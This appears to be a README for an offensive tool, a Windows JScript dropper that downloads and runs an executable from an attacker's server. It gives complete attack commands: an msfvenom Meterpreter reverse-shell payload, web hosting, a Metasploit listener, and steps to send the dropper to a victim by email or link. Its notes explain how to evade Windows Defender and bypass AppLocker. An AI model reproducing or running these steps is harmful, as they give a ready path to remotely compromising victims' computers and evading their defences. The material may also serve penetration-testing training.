# jscript

One file: `dropper.js`. **Standalone** — run by the victim, downloads and executes your payload.

---

## dropper.js

A Windows Script Host (WSH) JScript file. When the victim double-clicks it (or it runs via `wscript.exe dropper.js`), it:

1. Makes an HTTP GET request using `MSXML2.XMLHTTP` (built-in Windows COM object)
2. If the server returns HTTP 200, saves the binary response to disk as `bypassrunner.exe` using `ADODB.Stream`
3. Runs the saved `.exe` via `WScript.Shell.Run()`

---

## Customize

Change the URL at the top of the file:
```javascript
var url = "http://<YOUR_KALI_IP>/bypassrunner.exe";
```

---

## Prepare and deliver

```bash
# 1. Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f exe -o bypassrunner.exe

# 2. Host both files
cp bypassrunner.exe /var/www/html/
cp dropper.js /var/www/html/
python3 -m http.server 80

# 3. Start listener
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST <IP>; set LPORT 443; exploit -j"

# 4. Deliver — send victim the link to dropper.js, or email it
#    The victim double-clicks dropper.js → it runs via wscript.exe automatically
```

---

## Notes

- `.js` files run with `wscript.exe` by default on Windows — no installation required.
- The downloaded `.exe` is saved to the **current directory** (wherever `wscript.exe` is running from — often the user's Desktop or Downloads).
- If AppLocker blocks the downloaded `.exe`, use `nonDN2J.hta` instead (which uses InstallUtil to bypass AppLocker).
- Windows Defender may flag `.js` downloads — if so, rename to `.txt` and use `nonDN2J.hta`'s bitsadmin/certutil chain instead.
